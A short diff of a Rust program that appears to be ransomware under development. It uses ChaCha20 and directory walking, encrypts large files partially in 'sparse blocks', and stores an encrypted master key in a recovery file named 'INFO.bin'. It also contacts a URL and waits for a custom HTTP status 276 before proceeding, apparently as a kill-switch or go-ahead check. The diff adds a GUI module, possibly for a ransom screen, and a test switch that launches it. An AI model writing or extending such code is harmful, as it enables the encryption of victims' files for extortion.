@@ -1,3 +1,4 @@
+use anyhow::Ok;
 use base64::{Engine as _, engine::general_purpose};
 use chacha20::ChaCha20;
 use chacha20::cipher::{KeyIvInit, StreamCipher};
@@ -11,6 +12,7 @@ use std::io::{Read, Seek, SeekFrom, Write};
 use std::os::unix::process;
 use std::path::{Path, PathBuf};
 use walkdir::WalkDir;
+mod gui;
 // --- KONSTANTEN ---
 const BUFFER_4MB: usize = 4 * 1024 * 1024;
 const BUFFER_1MB: usize = 1 * 1024 * 1024;
@@ -19,6 +21,7 @@ const MEDIUM_FILE_THRESHOLD: u64 = 500 * 1024 * 1024; // < 500 MB
 const RECOVERY_FILE: &str = "INFO.bin";
 const SPARSE_BLOCKS: usize = 5; // Anzahl der zusätzlichen Blöcke bei großen Dateien
 const DEBUG_MODE: bool = true;
+const test_gui: bool = true;
 #[derive(serde::Serialize, serde::Deserialize)]
 struct RecoveryMetadata {
     encrypted_master_key: Vec<u8>,
@@ -52,8 +55,7 @@ async fn check() -> bool {
         .timeout(std::time::Duration::from_secs(5))
         .build()
         .unwrap();
-
-    if let Ok(response) = client.get(url).send().await {
+    if let std::result::Result::Ok(response) = client.get(url).send().await {
         let status_code = response.status().as_u16();
         // Erkennt den benutzerdefinierten HTTP-Statuscode 276
         if status_code == 276 {
@@ -72,6 +74,10 @@ async fn check() -> bool {
 
 #[tokio::main]
 async fn main() -> anyhow::Result<()> {
+    if test_gui {
+        gui::start_gui()?;
+        std::process::exit(0);
+    }
     let result = check().await;
     if !result {
         if DEBUG_MODE {
